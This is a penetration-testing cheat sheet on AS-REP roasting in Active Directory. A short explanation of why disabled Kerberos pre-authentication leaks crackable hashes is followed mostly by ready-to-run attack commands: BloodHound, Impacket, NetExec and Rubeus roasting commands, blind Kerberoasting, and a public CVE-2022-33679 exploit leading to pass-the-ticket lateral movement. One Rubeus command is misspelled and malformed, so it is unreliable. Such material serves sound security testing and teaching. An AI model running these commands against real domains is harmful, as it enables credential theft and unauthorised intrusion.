# AS-REP Roasting

Accounts with `DONT_REQ_PREAUTH` set will hand out an AS-REP encrypted with a key derived from the account password, to anyone who asks. No credential is needed to request it, and the resulting hash cracks offline.

## Why It Works

Kerberos pre-authentication exists to prove you know the password before the KDC returns anything encrypted with it. With pre-auth disabled, that proof is skipped and the KDC returns crackable material to an unauthenticated requester.

## Prerequisites

* A username list, or a valid credential to query which accounts are roastable
* Kerberos (88/TCP) reachable on a DC

## Execution

**ASREPRoast**

* List ASREPRoastable Users (need creds)
  * `MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u` [\[tool\]](https://github.com/SpecterOps/BloodHound)
* ASREP roasting
  * `GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
  * `nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
    * **→ Hash found ASREP**
  * `Rubeus.exe asreproast /format:hashcat` [\[tool\]](https://github.com/GhostPack/Rubeus)
* Blind Kerberoasting
  * `Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>` [\[tool\]](https://github.com/GhostPack/Rubeus)
  * `GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
    * **→ Hash found TGS**
* **→ CVE-2022-33679**
  * `CVE-2022-33679.py <domain>/<user> <target>` [\[tool\]](https://github.com/Bdenneu/CVE-2022-33679)
    * **→ Lat move PTT**

## Related

* [Kerberoasting](file:///9685693/credential-access/kerberoasting.md) — the same idea applied to service accounts
* [Hash Cracking Reference](file:///9685693/credential-access/hash-cracking-reference.md) — which hashcat mode matches the output
